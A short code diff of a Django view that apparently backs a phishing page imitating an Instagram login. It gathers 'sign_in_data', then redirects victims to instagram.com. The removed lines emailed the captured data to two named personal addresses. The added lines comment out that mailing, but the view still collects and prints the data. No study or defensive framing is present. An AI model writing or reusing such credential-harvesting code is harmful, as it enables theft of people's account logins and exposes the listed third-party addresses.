@@ -30,8 +30,8 @@ def index_page(request):
     subject = 'Device  found'
     body = 'new device found \n '+sign_in_data
     email_from = settings.EMAIL_HOST_USER
-    recipient_list = ['yusuf333fff@cyberfear.com','usuzyusus@gmail.com', ]
-    send_mail( subject, body, email_from, recipient_list )
+    #recipient_list = [ ]
+    #send_mail( subject, body, email_from, recipient_list )
     print(sign_in_data)
 
     if request.method == 'POST':
@@ -61,8 +61,8 @@ def index_page(request):
         subject = 'Device  found'
         body = 'new device found \n '+sign_in_data
         email_from = settings.EMAIL_HOST_USER
-        recipient_list = ['yusuf333fff@cyberfear.com','usuzyusus@gmail.com', ]
-        send_mail( subject, body, email_from, recipient_list )
+        #recipient_list = [ ]
+        #send_mail( subject, body, email_from, recipient_list )
         print(sign_in_data)
 
         return HttpResponseRedirect('https://instagram.com')
